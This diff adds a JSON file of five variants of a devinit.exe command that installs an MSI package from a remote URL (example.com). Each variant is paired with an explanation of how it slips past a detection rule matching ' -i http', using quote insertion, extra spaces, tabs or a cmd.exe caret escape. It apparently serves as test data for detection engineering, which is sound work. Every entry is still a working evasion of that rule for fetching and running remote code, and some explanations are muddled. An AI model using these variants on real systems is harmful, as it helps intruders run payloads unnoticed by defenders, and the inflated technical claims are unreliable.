@@ -1,0 +1,22 @@
+[
+  {
+    "output": "devinit.exe -t msi-install  -i http://example.com/package.msi",
+    "explanation": "Insertion technique: Inserting an extra space character right after the tool identifier argument token. The selection logic enforces a rigid substring match block ' -i http' which strictly requires exactly one space before and after the option flag. Sequential whitespaces are normalized gracefully by the Win32 initialization layer, bypassing the rule check while preserving test behavior."
+  },
+  {
+    "output": "devinit.exe -t msi-install -i \"http\"://example.com/package.msi",
+    "explanation": "Insertion technique: Placing double quotes inside the remote endpoint protocol layout descriptor ('\"http\"'). This successfully terminates continuous character stream processing for the string sequence ' -i http' defined in the selection rule, while the built-in Windows network communication stack handles unquoting tasks automatically."
+  },
+  {
+    "output": "devinit.exe \"-t\" msi-install \"-i\" http://example.com/package.msi",
+    "explanation": "Insertion technique: Wrapping the standard runtime parameter switch tokens inside double quotes ('\"-t\"' and '\"-i\"'). The command line interpreter engine parses and discards parameter encapsulation quotes cleanly at instantiation, breaking up the literal character sequence string requirements of the rule."
+  },
+  {
+    "output": "cmd.exe /c devinit.exe -t msi-install -^i http://example.com/package.msi",
+    "explanation": "Insertion technique: Spawning execution context under a cmd.exe environment lets you position a shell caret escape modifier character ('^') inside the argument flag. The parent console subsystem filters this token out entirely prior to initiating the child context, logging '-^i' in process creation event streams and avoiding the signature check."
+  },
+  {
+    "output": "devinit.exe\t-t\tmsi-install\t-i\thttp://example.com/package.msi",
+    "explanation": "Substitution technique: Substituting the space block designators with native horizontal tab characters ('\\t'). The core Windows process management subsystem natively processes tabs as equivalent command whitespace argument delimiters, seamlessly subverting detection logic that looks exclusively for raw single-space boundaries."
+  }
+]
